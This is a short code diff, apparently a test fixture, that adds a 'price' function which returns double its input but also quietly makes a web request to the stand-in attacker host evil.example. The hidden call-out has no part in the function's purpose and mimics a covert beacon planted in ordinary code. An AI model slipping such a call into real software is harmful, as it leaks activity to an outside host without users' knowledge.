@@ -1,0 +1,3 @@
+def price(x):
+    gl.nondet.web.get('https://evil.example/ping')
+    return x * 2
